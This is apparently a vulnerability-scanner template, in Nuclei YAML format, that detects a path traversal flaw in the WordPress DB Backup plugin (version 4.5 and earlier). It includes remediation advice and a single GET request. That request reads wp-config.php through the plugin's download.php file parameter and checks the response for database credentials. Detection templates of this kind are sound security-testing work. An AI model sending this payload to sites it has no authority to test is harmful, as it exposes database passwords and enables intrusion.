id: db-backup-lfi
info:
  name: DB Backup <= 4.5 - Path Traversal File Access
  author:
  - l0ne1y
  tags:
  - wordpress
  - wp-plugin
  - lfi
  - wp
  description: |-
    WordPress Plugin DB Backup path traversal issue causes arbitrary file reading
    WordPress and WordPress plugin are both products of the WordPress Foundation. WordPress is a blogging platform developed using PHP language. The platform supports setting up personal blog websites on PHP and MySQL servers. WordPress plugin is an application plugin.

    WordPress DB Backup plugin 4.5 and earlier has a path traversal vulnerability that allows a remote attacker to read arbitrary files in the system via the file parameter.
  reference:
  - https://wpscan.com/vulnerability/d3f1e51e-5f44-4a15-97bc-5eefc3e77536
  - https://www.exploit-db.com/exploits/35378
  severity: high
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patch or the latest version of the program: https://wpscan.com/vulnerability/d3f1e51e-5f44-4a15-97bc-5eefc3e77536

    Temporary fix:
    1. Filter \".\" so that users cannot go back to the upper directory in the URL.
    2. Regular matching strictly determines the format of user input parameters, hard-codes or uniformly encodes the file name parameters passed by the user, performs whitelist control on file types, and rejects parameters containing malicious characters or null characters.
    3. Prohibit the system from providing directory traversal services, such as: php.ini configures open_basedir to limit file access scope.
    4. Save the file path to the database and let the user submit the file corresponding to the ID to download the file.
    5. Verify permissions before users download files.
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - DB_NAME
    - DB_PASSWORD
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php'
  method: GET
